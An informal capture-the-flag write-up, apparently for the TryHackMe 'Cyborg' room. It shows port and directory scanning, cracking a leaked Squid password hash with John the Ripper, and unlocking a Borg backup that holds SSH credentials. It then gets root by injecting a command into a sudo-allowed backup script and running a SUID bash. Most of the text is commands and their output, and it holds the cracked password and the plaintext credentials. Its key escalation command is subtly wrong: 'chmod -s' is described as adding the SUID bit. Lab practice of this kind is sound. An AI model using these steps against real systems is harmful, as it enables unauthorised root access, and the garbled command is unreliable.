lets try nmap to see open ports 

nmap -sC -sV 10.10.10.120

we found 2 ports ssh and http open on 22 and 80

lets try gobuster 
gobuster dir -u http://10.10.10.120/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  

we found http://10.10.10.120/admin/ and http://10.10.10.120/etc/

we found here : http://10.10.10.120/etc/squid/

a "passwd" file and "squid.conf" file 

passwd

//////////

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

lets put it in hash.txt


/////////

squid.conf

/////////

auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users

////////


we found a file called archive.tar from the downloads 


returning to what we get from passwd we found a password 

///////////////

we can use hash-identifier to identifie the hash 


john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2025-03-19 11:18) 7.692g/s 301292p/s 301292c/s 301292C/s jeremy21..lilica
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


//////////////


lets try to use ssh on the names of the conversation here 

http://10.10.10.120/admin/admin.html 

and we will use the info in squid.conf later inchalah 

lets try to use the password we found using jhon to extract the downloaded borg archive , borg is a backkup software


so acording to chatgpt : what we found in /etc/squid/passwd is the file that contains the usernames and their corresponding encrypted passwords. 


lets use the hash pass to get the archive to be revealed

LETS find a way to untar the archive 10.10.10.120 

i extracted it using root access 

////////////

┌──(Abad㉿kali)-[~/Desktop/work/tryhackme/cyborg]
└─$ sudo -s         
[sudo] password for Abad: 
┌──(root㉿kali)-[/home/…/Desktop/work/tryhackme/cyborg]
└─# tar -xvf archive.tar     
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
                                                                                
┌──(root㉿kali)-[/home/…/Desktop/work/tryhackme/cyborg]
└─# 


lets go to this documentation page so that we extract the archive 
 ──(root㉿kali)-[/home/…/home/field/dev/final_archive]
└─# ls -l 
total 68
-rw------- 1 1000 1000   964 Dec 29  2020 config
drwx------ 3 1000 1000  4096 Dec 29  2020 data
-rw------- 1 root root    54 Dec 29  2020 hints.5
-rw------- 1 root root 41258 Dec 29  2020 index.5
-rw------- 1 root root   190 Dec 29  2020 integrity.5
-rw------- 1 root root    16 Dec 29  2020 nonce
-rw------- 1 1000 1000    73 Dec 29  2020 README
                                                                                
┌──(root㉿kali)-[/home/…/home/field/dev/final_archive]
└─# cat README          
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

////////////

lets use this cmnd to extract the archive using the username and the eralier pass phrase 

borg extract /home/kali/Desktop/work/tryhackme/cyborg/home/field/dev/final_archive::music_archive

and we dont forget to use the password we found 

//////

borg extract /home/kali/Desktop/work/tryhackme/cyborg/home/field/dev/final_archive::music_archive
Enter passphrase for key /home/kali/Desktop/work/tryhackme/cyborg/home/field/dev/final_archive: squidward

/////


so we got acess to a user directory 

//////////
┌──(root㉿kali)-[/home/…/home/field/dev/final_archive]
└─# cd home                         
                                                                                
┌──(root㉿kali)-[/home/…/field/dev/final_archive/home]
└─# ls
alex
                                                                                
┌──(root㉿kali)-[/home/…/field/dev/final_archive/home]
└─# cd alex    
                                                                                
┌──(root㉿kali)-[/home/…/dev/final_archive/home/alex]
└─# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
                                                                                
┌──(root㉿kali)-[/home/…/dev/final_archive/home/alex]
└─# 

/////////


we found here something 
///////

┌──(root㉿kali)-[/home/…/final_archive/home/alex/Documents]
└─# cat note.txt  
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
                                            

///////

now lets log in via ssh 

 ssh alex@10.10.151.11   
 
 
we found the user.txt : 
///////////

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ ^C
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

 ///////////////
 
 lets see our privileges 
 
 //////////'
 
 alex@ubuntu:~$ sudo -l 
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

 
 ////////
 
 
 lets see what we have priviliges on 
 
 
 ////////////
 
 alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished

alex@ubuntu:~$ 


 S3cretP@s3
 
 ////////////
 
 
 
 when we see the file we see that we have a cmnd injection capability 
 
 ///////////////
 alex@ubuntu:~/Documents$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~/Documents$ ls -l /etc/mp3backups/
total 12
-rw-r--r-- 1 root root  339 Mar 19 08:09 backed_up_files.txt
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 backup.sh
-rw-r--r-- 1 root root   45 Mar 19 08:09 ubuntu-scheduled.tgz
alex@ubuntu:~/Documents$ cat backup.sh
cat: backup.sh: No such file or directory
alex@ubuntu:~/Documents$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

 
 /////////
 
 
 
 
 this is how i became root 
 
 ///////////
 
 How Does the Code Allow Command Injection?

The vulnerability exists in the following lines inside /etc/mp3backups/backup.sh:

while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done

This code processes command-line arguments and assigns the value of the -c flag to the variable command.

Later, this variable is executed as a command in the following line:

cmd=$($command)
echo $cmd

Here’s a breakdown of why this is a command injection vulnerability:

    User Input is Passed Directly to command
        The script reads the -c flag from the command-line arguments.
        Whatever value we pass to -c is stored in the command variable.

    User Input is Executed Without Validation
        The line cmd=$($command) effectively runs whatever the user provided inside $command.
        This is equivalent to running eval $command, which allows arbitrary command execution.

    Script Runs with sudo Privileges
        The sudo -l output shows that the script can be run as root without a password:

(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

This means any command injected through -c will execute as root.
 
 //////////
 
 
 so we became root by specifying the cmnd and the flag 
 //////////////
 
sudo /etc/mp3backups/backup.sh -c "chmod -s /bin/bash"

chmod -s /bin/bash : will adds the SUID bit to /bin/bash. This means that whenever any user executes /bin/bash, it will run with the file owner's privileges—which, in this case, is root.



The SUID (Set User ID) bit is a special permission that can be set on executable files in Unix-like operating systems (Linux, macOS, etc.). When an executable file has the SUID bit set, it allows a user to run the program with the file owner's privileges, rather than the privileges of the user running it.


Run Bash with the SUID bit (if it's set): If /bin/bash has the SUID bit set (as explained earlier), you can run it to get a root shell:

/bin/bash -p

///////////


alex@ubuntu:~$ /bin/bash -p
bash-4.3# ls
Desktop    Downloads  Pictures	Templates  Videos
Documents  Music      Public	user.txt
bash-4.3# pwd
/home/alex
bash-4.3# find / -name "root.txt" 2>/dev/null

/root/root.txt
bash-4.3# 
bash-4.3# cat /root/root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
bash-4.3# 




///////////








 
 /////////////
 
 
 
 
 
 
 
